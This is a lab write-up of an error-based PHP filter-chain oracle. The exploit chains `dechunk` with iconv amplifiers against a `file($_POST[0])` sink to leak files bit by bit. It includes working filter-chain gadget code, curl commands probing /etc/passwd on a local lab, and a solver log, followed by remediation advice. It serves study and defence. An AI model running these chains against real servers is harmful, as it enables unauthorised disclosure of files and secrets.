# 13 — The End of AFR: an error-based filter-chain oracle — Writeup

## TL;DR

`php://filter`'s `dechunk` erases a stream **iff** its first byte is a hex
digit; `convert.iconv.L1.UCS-4LE` multiplies stream length by four. Chain
`dechunk` in front of ~16 `UCS-4LE` hops and PHP either finishes quietly (200)
or dies on `memory_limit` (500) — one bit of oracle per request, with no
output from the application at all. Base64-encode the file to get a 64-symbol
alphabet, rotate any symbol to offset 0 with endianness gadgets, and classify
it with a decision tree of iconv code-page conversions. 349 requests and about
3 seconds dump the flag.

## The bug

The whole application:

```php
<?php file($_POST[0]);
```

`file()` takes a *stream URL*, and PHP's `php://filter` wrapper lets the caller
insert an arbitrary list of filters between the file and the reader:

```
php://filter/<filter1>|<filter2>|.../resource=/flag.txt
```

Filters run left to right as the data is pulled through. That is the whole
attack surface: the return value is discarded, nothing is echoed, and
`display_errors` is off. Three properties of PHP's own filter implementations
are enough.

### Block 1 — `dechunk` is a conditional erase

`dechunk` (`ext/standard/filters.c`, `php_dechunk`) decodes HTTP
chunked-transfer-encoding. It starts in state `CHUNK_SIZE_START` and tries to
read a hexadecimal chunk size:

* if the very first byte is **not** in `[0-9A-Fa-f]`, the parser goes straight
  to `CHUNK_ERROR`, which `memmove`s the rest of the buffer to the output — the
  stream passes through **untouched**;
* if it **is** a hex digit, the parser consumes the size, then looks for
  `\r\n` and a chunk body. For a stream that is not really chunked-encoded
  (no newlines, wrong lengths), it never produces anything — the stream comes
  out **empty**.

```sh
php -r 'file_put_contents("/tmp/x","hello");
        var_dump(file_get_contents("php://filter/dechunk/resource=/tmp/x"));'
# string(5) "hello"

php -r 'file_put_contents("/tmp/x","beef");
        var_dump(file_get_contents("php://filter/dechunk/resource=/tmp/x"));'
# string(0) ""
```

| input     | output    |
|-----------|-----------|
| `"hello"` | `"hello"` |
| `"beef"`  | `""`      |
| `"0wned"` | `""`      |
| `"Zorro"` | `"Zorro"` |

So `dechunk` answers *"is the first byte of this stream a hex digit?"* — but it
answers by changing the length of a stream nobody can see.

### Block 2 — `convert.iconv.L1.UCS-4LE` is an amplifier

Converting from a single-byte charset to UCS-4 makes every byte four bytes
wide. Chain it and the output of hop *n* is re-interpreted as Latin-1 by hop
*n+1*, so the length is multiplied by four **every time**:

```sh
php -r 'file_put_contents("/tmp/x","AB");
        foreach (range(1,4) as $n) {
          $c = implode("|", array_fill(0,$n,"convert.iconv.L1.UCS-4LE"));
          echo $n, " hops -> ", strlen(file_get_contents("php://filter/$c/resource=/tmp/x")), "\n";
        }'
# 1 hops -> 8
# 2 hops -> 32
# 3 hops -> 128
# 4 hops -> 512
```

`memory_limit` is 128M = 134217728 bytes, and `4^14 = 268435456`. So a single
surviving byte plus fourteen hops is already fatal, while an **empty** stream
survives any number of hops. Put the two blocks together:

```sh
curl -s -o /dev/null -w '%{http_code}\n' -X POST \
  --data-urlencode "0=php://filter/dechunk$(printf '|convert.iconv.L1.UCS-4LE%.0s' {1..14})/resource=/etc/passwd" \
  http://127.0.0.1:8013/
# 500      <- /etc/passwd starts with 'r', dechunk kept it, PHP died

curl -s -o /dev/null -w '%{http_code}\n' -X POST \
  --data-urlencode "0=php://filter/dechunk$(printf '|convert.iconv.L1.UCS-4LE%.0s' {1..14})/resource=/etc/hostname" \
  http://127.0.0.1:8013/
# 200      <- the container hostname is hex, dechunk erased it
```

With `display_errors=On` the 500 is exactly what the article shows:

```
Fatal error: Allowed memory size of 134217728 bytes exhausted
(tried to allocate 109969408 bytes) in /var/www/html/index.php on line 1
```

**The observable in this lab is the HTTP status code: 500 = the stream survived
`dechunk`, 200 = it was erased.** (Body length and timing work too; the body is
always empty and the fatal path is ~30 ms slower.)

### Block 3 — reaching byte *n*, and telling 64 symbols apart

One bit about *the first byte* is not a file read. Two more problems:

**(a) the alphabet.** Raw file bytes can be anything; the hex-digit test only
splits 22 values out of 256. Fix: prepend `convert.base64-encode` so the stream
is a string over a known 64-symbol alphabet. Everything after that manipulates
base64 text.

**(b) the offset.** Nothing in PHP's filter list *removes* characters from the
front of a stream. What exists is a set of conversions that **permute** them:

```sh
php -r 'file_put_contents("/tmp/x","abcdefgh");
        $f = fn($c) => file_get_contents("php://filter/$c/resource=/tmp/x");
        var_dump($f("convert.iconv.UCS-4LE.10646-1:1993"));   // r4
        var_dump($f("convert.iconv.CSUNICODE.UCS-2BE"));      // r2
        echo bin2hex($f("convert.iconv.CSUNICODE.CSUNICODE")), "\n";'
# string(8) "dcbahgfe"      r4: reverse every group of 4
# string(8) "badcfehg"      r2: swap every pair
# fffe6162636465666768      CSUNICODE.CSUNICODE prepends a BOM
```

`r4` and `r2` alone only expose the first four characters. The trick
(@loknop / @hashkitten) is that prepending the two BOM bytes *shifts the
grouping*: after `CSUNICODE.CSUNICODE`, `r4` puts characters 5 and 6 next to
the two garbage bytes, and a `convert.base64-decode|convert.base64-encode`
round trip silently drops anything outside the base64 alphabet. Repeating that
"flip" walks the string two characters at a time.

The flip needs the string length to stay a multiple of four, which is why the
file is base64-encoded **twice** and why the result must end in exactly `==`.
`convert.quoted-printable-encode` rewrites `=` as `=3D`, i.e. it adds two bytes
per `=` per application and leaves everything else alone:

```sh
php -r 'file_put_contents("/tmp/x","QUJD==");
        foreach (range(1,3) as $n) {
          $c = implode("|", array_fill(0,$n,"convert.quoted-printable-encode"));
          echo file_get_contents("php://filter/$c/resource=/tmp/x"), "\n"; }'
# QUJD=3D=3D
# QUJD=3D3D=3D3D
# QUJD=3D3D3D=3D3D3D
```

That is also how the exploit *detects* the padding: with an amplifier one hop
below the kill threshold, a few hundred `quoted-printable-encode` rounds only
push the stream over `memory_limit` when a `=` is actually present. Exactly one
of "0, 1 or 2 blocks of `convert.iconv..CSISO2022KR` junk" (which prepends the
four bytes `1b 24 29 43`) makes the doubly-encoded length a multiple of three,
i.e. no padding — the next one is the one that gives `==`.

**Classification.** With a base64 digit sitting at offset 0, the hex-digit test
splits the alphabet into `ABCDEFabcdef0123456789` versus the rest. Other splits
come from code-page conversions, which shuffle ASCII in interesting ways:

```
(none)                                     -> ABCDEFabcdef0123456789
convert.iconv.CA.CP930                     -> abcde/
convert.iconv.500.CP937                    -> a0123456789
string.rot13                               -> NOPQRSnopqrs0123456789
convert.iconv.CP1390.IBM932|string.rot13   -> vwx
```

I enumerated these mechanically rather than by hand. `iconv -l` inside the
image lists 1180 aliases; 1072 of them round-trip the 65-character probe
`A..Za..z0..9+/=` as single bytes, and all 1072² ordered pairs yield **171
distinct byte maps** over that probe (most code pages agree on ASCII, so the
vast majority collapse). Composing each map with `string.rot13`,
`string.toupper`, `string.tolower` before and after gives **142 distinct
splits** of the 64 base64 digits.

Those 142 splits are not enough on their own: no iconv conversion separates the
ten ASCII digits from each other, because every code page keeps `0`-`9`
contiguous. Two derived families fix that:

* `convert.base64-encode|<split>` tests the digit's **top six bits**, because
  base64 maps byte `c` to `ALPHA[c >> 2]`;
* `convert.iconv.UTF8.UTF16LE|convert.base64-encode|r2|<split>` tests the
  **bottom two bits**: UTF-16LE interleaves a NUL after every ASCII byte, so
  the second base64 character is exactly `ALPHA[(c & 3) << 4]` — deterministic,
  independent of what follows — and `r2` swaps it into first position.

```sh
php -r 'file_put_contents("/tmp/x","Qxyz");
        echo substr(file_get_contents("php://filter/convert.iconv.UTF8.UTF16LE|"
          ."convert.base64-encode|convert.iconv.CSUNICODE.UCS-2BE/resource=/tmp/x"),0,4),"\n";'
# QU4B      first char 'Q' = ALPHA[(0x51 & 3) << 4]
```

426 candidate tests over 64 symbols, greedily picked closest-to-half at every
node, produce a decision tree of depth 5–7, **6.03 requests per base64 digit on
average**, using 35 distinct filter chains.

## Building the exploit

1. **Calibrate the amplifier.** Binary search the smallest number of
   `convert.iconv.L1.UCS-4LE` hops that makes
   `convert.base64-encode|convert.base64-encode` of the target blow up. On this
   lab that is 10; the exploit then uses 16, so that a *single* surviving byte
   is fatal. (~6 requests)
2. **Find the padding.** For 0/1/2 blocks of `convert.iconv..CSISO2022KR`, run
   *N* `convert.quoted-printable-encode` (N doubling from 64) followed by
   `w0 - 1` amplifier hops. Exactly one of the three does not blow up: that is
   the length that has no `=` at all, so the next one ends in `==`. (~3–12
   requests)
3. **Walk the string.** For n = 0, 1, 2, …:
   `header | get_nth(n) | <tree node> | dechunk | amplifier`, descending the
   tree on the 500/200 answer, until the leaf gives the base64 digit.
4. **Decode and stop.** Outer base64 → inner base64 (minus the `\x1b$)C` junk
   blocks) → plaintext. Positions are dumped in waves of 8 by a thread pool and
   the loop stops as soon as a `PHRACK{...}` shows up in the decoded bytes.

`get_nth(n)` is the gadget from @hashkitten's original solve, which I kept as
is because it is the only known way to index into the stream:

```python
R2   = "convert.iconv.CSUNICODE.UCS-2BE"
R4   = "convert.iconv.UCS-4LE.10646-1:1993"
QPE  = "convert.quoted-printable-encode"
FLIP = "|".join([QPE, QPE] + ["convert.iconv.L1.utf7"] * 4 +
                ["convert.iconv.CSUNICODE.CSUNICODE", R4,
                 "convert.base64-decode", "convert.base64-encode"])

def get_nth(n):
    out, chunk = [], n // 2
    if chunk % 2:              out.append(R4)
    out += [FLIP, R4] * (chunk // 2)
    if (n % 2) ^ (chunk % 2):  out.append(R2)
    return "|".join(out)
```

## The exploit

`solve/solve.py`, Python 3 standard library only. Stages:

| stage | code | requests |
|-------|------|----------|
| amplifier calibration | binary search on `Oracle.survives` | 6 |
| padding detection | `quoted-printable-encode` length probe | 3 |
| per-digit classification | `classify()` walking `TREE` | 6.03 avg |
| decode / stop condition | `decode()` on each wave of 8 | 0 |

`TREE` is the generated decision tree embedded as JSON: every node is
`[filter_chain, subtree_if_hexdigit, subtree_otherwise]`.

Live run against the lab (flag = 30 bytes, 56 outer base64 digits):

```
[*] amplifier   x4 per hop, 10 hops kill the stream, using 16
[*] padding     0 x CSISO2022KR junk block(s)
[*]  56 digits    349 requests   xlMlJsWTJoMWJtdGZZVzF3YkdsbWVWOXlaWEJsWVhSOQ+W
[*] 349 requests total
FLAG: PHRACK{dechunk_amplify_repeat}
```

**349 requests, ~3.4 s wall clock with 8 threads** (the whole `make verify`
cycle including the image build is under 10 s). Each "500" request really does
allocate 128 MB inside PHP before dying, which is why the solver is capped at 8
threads and why `docker-compose.yml` gives the container `mem_limit: 2g` — 8 ×
128 MB of PHP plus Apache needs head-room, and a cgroup OOM kill would also
look like a 500 and poison the oracle.

## Fixing it

The bug is not in `dechunk` or in iconv; it is that a request parameter reaches
a filesystem API as a *stream URL*.

```php
// 1. never let user input pick the wrapper
$name = basename($_POST['0'] ?? '');              // kills php://, phar://, ...
$path = realpath(__DIR__ . '/uploads/' . $name);
if ($path === false || strncmp($path, __DIR__ . '/uploads/', ...) !== 0) {
    http_response_code(400); return;
}
file($path);
```

Defence in depth, in rough order of usefulness:

* **Allow-list the wrapper.** `stream_wrapper_unregister('php')` (and `phar`,
  `data`, `expect`, …) at the top of the request removes the primitive
  entirely. This is the real fix on every version: even with PHP 8.6's filter
  cap, `php://filter` itself is still there.
* `allow_url_include=0` does **not** help — nothing here is an include.
* `open_basedir` restricts which *files* can be reached but not the filter
  chain itself, so it limits the damage without closing the oracle.
* `memory_limit=-1` removes this particular oracle but replaces it with the
  OOM killer, and cfreal's `lightyear` has an error-based oracle that does not
  need memory exhaustion at all
  (`convert.iconv.UTF16.UTF16|convert.quoted-printable-encode|convert.base64-decode`
  raises a warning instead). Do not rely on it.
* PHP now *does* cap the number of filters in a chain: php-src issue #10453
  became the RFC "Limit maximum number of filter chains", accepted 30/0/2 and
  implemented in **PHP 8.6** — more than 16 filters raises a deprecation in 8.6
  and becomes an error in 8.7, adjustable only through the
  `filter.max_filter_count` stream-context option, not through php.ini. A cap
  of 16 kills this attack outright, not just slows it: even the shortest chain
  the solver sends — `convert.base64-encode|convert.base64-encode` + a tree
  node + `dechunk` + the 16 amplifier hops, for digit 0 at offset 0 — is
  already 19 filters, and `get_nth(n)` adds ~5 more per digit after that.
  `labs/12-filter-chain-rce`, whose 138-filter chain dies the same way on
  8.6+, carries the same note.

## Going further

* **Scale.** `get_nth(n)` grows linearly with `n`, so the POST body grows with
  the offset — around 8 KB for the 56 digits here, tens of KB for a real
  source file, and the request count grows with it. cfreal's **lightyear**
  replaces the walk with "jumps": for most base64 digits there is a short
  conversion chain that turns *that* digit into a `\n`, which lets `dechunk`
  truncate the stream at a previously recovered position in a constant-size
  payload. That is what makes dumping tens of kilobytes practical.
* **GET instead of POST.** Synacktiv's `php_filter_chains_oracle_exploit`
  documents a practical ceiling around 135 characters when the sink is a query
  string.
* **Compression.** Prefixing `zlib.deflate` shrinks repetitive files before the
  dump, cutting the number of digits.
* **Other oracles.** Response timing works when the status code is normalised
  by a proxy; so does response size when the app prints something.
* Try the sibling lab `12-filter-chain-rce` (loknop's LFI→RCE construction) —
  the same primitives used to *write* data rather than read it.

## Known limitations of this lab

* `solve/solve.py` stops as soon as the decoded plaintext matches
  `PHRACK{...}`. It has no length oracle, so pointing it at an arbitrary file
  will dump until the 4096-digit cap and then print whatever it recovered
  (`rawdump`). A general tool needs either a length oracle or lightyear's
  truncation jumps.
* The decision tree was generated against glibc's iconv as shipped in
  `php:8.1.34-apache` (Debian bookworm). A musl-based image has a much smaller
  charset table and the tree would have to be regenerated.
* Concurrency is bounded by RAM: each positive answer allocates `memory_limit`
  bytes in Apache. 8 threads × 128 MB is the reason `mem_limit: 2g` is in the
  compose file.

## References

* Orange Tsai, *"The Art of PHP - My CTF Journey and Untold Stories!"*,
  Phrack #72, section 4.1 "Level 2 - The End of AFR".
* @hashkitten, `minimal-php`, DownUnderCTF 2022 — challenge and solution:
  <https://github.com/DownUnderCTF/Challenges_2022_Public/tree/main/web/minimal-php>
  (the `r2` / `r4` / `flip` / `get_nth` positional gadget is his).
* @loknop, *"Solving any PHP LFI with filter chains"*:
  <https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d>
* Rémi "Remsio" Matasse, Synacktiv, *"PHP filter chains: file read from
  error-based oracle"*:
  <https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle>
  and <https://github.com/synacktiv/php_filter_chains_oracle_exploit>
* Charles "cfreal" Fol, Ambionics, *wrapwrap*:
  <https://github.com/ambionics/wrapwrap> and
  <https://www.ambionics.io/blog/wrapwrap-php-filters-suffix>
* Charles "cfreal" Fol, Ambionics, *lightyear*:
  <https://github.com/ambionics/lightyear> and
  <https://www.ambionics.io/blog/lightyear-file-dump>
* PHP source: `ext/standard/filters.c` (`php_dechunk`, `php_conv_qprint_encode`)
  and `ext/iconv/iconv.c` (`php_iconv_stream_filter`).
* php-src issue #10453, "Limit maximum number of filter chains as a security
  measure" — <https://github.com/php/php-src/issues/10453> — and the resulting
  RFC <https://wiki.php.net/rfc/limit-maximum-number-of-filter-chains>.
